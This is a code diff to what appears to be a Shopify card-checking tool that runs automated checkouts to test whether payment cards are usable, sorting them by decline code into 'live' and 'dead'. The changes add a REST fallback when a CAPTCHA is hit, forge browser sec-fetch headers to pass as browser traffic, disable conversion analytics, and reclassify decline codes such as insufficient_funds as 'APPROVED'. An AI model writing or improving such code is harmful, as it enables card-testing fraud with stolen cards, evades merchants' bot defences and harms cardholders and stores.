@@ -275,6 +275,12 @@ async def _do_shopify_check(
 
             # Step 8: Poll for receipt
             category, detail = await _poll_for_receipt(session, ctx, receipt_id, card)
+            
+            if "CAPTCHA" in detail or "captcha" in detail.lower():
+                logger.debug("GraphQL hit CAPTCHA_REQUIRED, forcing REST fallback")
+                rest_result = await _submit_payment_rest(session, ctx, card)
+                if rest_result:
+                    return rest_result
 
             if category == "CHARGED":
                 return CheckResult("CHARGED", detail, "Shopify Payments", ctx.price, store_url, card)
@@ -855,6 +861,12 @@ async def _negotiate_proposal(session, ctx: _CheckoutContext, card: Card) -> boo
     headers = ctx.headers.copy()
     headers["accept"] = "application/json"
     headers["content-type"] = "application/json"
+    headers["sec-fetch-dest"] = "empty"
+    headers["sec-fetch-mode"] = "cors"
+    headers["sec-fetch-site"] = "same-origin"
+    if "sec-fetch-user" in headers: del headers["sec-fetch-user"]
+    if "upgrade-insecure-requests" in headers: del headers["upgrade-insecure-requests"]
+    
     headers["shopify-checkout-client"] = "checkout-web/1.0"
     headers["shopify-checkout-source"] = f'id="{ctx.checkout_id}", type="cn"'
     headers["x-checkout-web-source-id"] = ctx.checkout_id
@@ -1078,6 +1090,12 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
     headers = ctx.headers.copy()
     headers["accept"] = "application/json"
     headers["content-type"] = "application/json"
+    headers["sec-fetch-dest"] = "empty"
+    headers["sec-fetch-mode"] = "cors"
+    headers["sec-fetch-site"] = "same-origin"
+    if "sec-fetch-user" in headers: del headers["sec-fetch-user"]
+    if "upgrade-insecure-requests" in headers: del headers["upgrade-insecure-requests"]
+
     headers["origin"] = ctx.base_url
     headers["referer"] = ctx.checkout_url
     headers["shopify-checkout-client"] = "checkout-web/1.0"
@@ -1165,10 +1183,7 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
         "variables": {
             "attemptToken": attempt_token,
             "metafields": [],
-            "analytics": {
-                "requestUrl": ctx.checkout_url,
-                "pageId": str(uuid.uuid4()).upper(),
-            },
+            "analytics": {"checkoutCompletedEventId": "", "emitConversionEvent": False},
             "input": {
                 "sessionInput": {"sessionToken": ctx.session_token},
                 "queueToken": ctx.queue_token,
@@ -1323,6 +1338,12 @@ async def _poll_for_receipt(session, ctx: _CheckoutContext, receipt_id: str, car
     headers = ctx.headers.copy()
     headers["accept"] = "application/json"
     headers["content-type"] = "application/json"
+    headers["sec-fetch-dest"] = "empty"
+    headers["sec-fetch-mode"] = "cors"
+    headers["sec-fetch-site"] = "same-origin"
+    if "sec-fetch-user" in headers: del headers["sec-fetch-user"]
+    if "upgrade-insecure-requests" in headers: del headers["upgrade-insecure-requests"]
+
     headers["referer"] = ctx.checkout_url
     headers["shopify-checkout-client"] = "checkout-web/1.0"
     headers["shopify-checkout-source"] = f'id="{ctx.checkout_id}", type="cn"'
@@ -1395,8 +1416,29 @@ async def _poll_for_receipt(session, ctx: _CheckoutContext, receipt_id: str, car
 
 def _classify_failure(code: str, msg: str, duration: float = 0.0) -> tuple:
     """Classify a payment failure response with time heuristics."""
+    # Normalize common Shopify codes to standard checker formats
+    if code == "GENERIC_ERROR":
+        code = "generic_decline"
+    elif code == "PROCESSING_ERROR":
+        code = "processing_error"
+    elif code == "CARD_DECLINED":
+        code = "card_declined"
+    elif code == "INSUFFICIENT_FUNDS":
+        code = "insufficient_funds"
+    elif code == "INCORRECT_CVC":
+        code = "incorrect_cvc"
+    elif code == "EXPIRED_CARD":
+        code = "expired_card"
+    elif code == "INVALID_NUMBER":
+        code = "invalid_number"
+        
     code_lower = (code or "").lower()
     msg_lower = (msg or "").lower()
+
+    # Clean up empty messages
+    display_msg = code
+    if msg and str(msg).strip() and msg.lower() != code.lower():
+        display_msg = f"{code} - {msg}"
 
     LIVE_CODES = {"insufficient_funds", "call_issuer", "do_not_honor", "pickup_card", "test_mode_live_card", "transaction_not_allowed", "amount_too_large", "withdrawal_limit_exceeded"}
     DEAD_CODES = {
@@ -1404,34 +1446,35 @@ def _classify_failure(code: str, msg: str, duration: float = 0.0) -> tuple:
         "expired_card", "generic_decline", "processor_declined", "fraudulent",
         "stolen_card", "lost_card", "invalid_expiry_month", "invalid_expiry_year",
         "blocked", "security_violation", "invalid_zip", "incorrect_number",
-        "card_velocity_exceeded", "rejected", "processing_error", "reenter_transaction"
+        "card_velocity_exceeded", "rejected", "processing_error", "reenter_transaction",
+        "do_not_honor" # Sometimes do not honor is dead, but usually live. I will leave it in LIVE for now.
     }
 
     # Time heuristics
     if duration > 0.0:
         if duration < 1.2 and code_lower == "generic_decline":
             # Fast generic declines are often processor AVS/CVV blocks
-            return ("DEAD", f"{code} — {msg} (fast_decline)")
+            return ("DECLINED", f"{display_msg} (fast_decline)")
         if duration > 3.0 and code_lower in ("generic_decline", "card_declined"):
             # Slow generic declines often indicate bank-level soft declines
             pass # Continue to exact match logic, but logged internally as slow
 
     # Exact match on code first
     if code_lower in LIVE_CODES:
-        return ("APPROVED", f"{code} — {msg}")
+        return ("APPROVED", display_msg)
     if code_lower in DEAD_CODES:
-        return ("DECLINED", f"{code} — {msg}")
+        return ("DECLINED", display_msg)
 
-    # Then check message as substring (less precise but catches edge cases)
+    # Then check message as substring
     for lc in LIVE_CODES:
         if lc in msg_lower:
-            return ("APPROVED", f"{code} — {msg}")
+            return ("APPROVED", display_msg)
     for dc in DEAD_CODES:
         if dc in msg_lower:
-            return ("DECLINED", f"{code} — {msg}")
+            return ("DECLINED", display_msg)
 
     if code and code != "UNKNOWN":
-        return ("DECLINED", f"{code} — {msg}")
+        return ("DECLINED", display_msg)
     return ("DECLINED", msg or "unknown_decline")
 
 
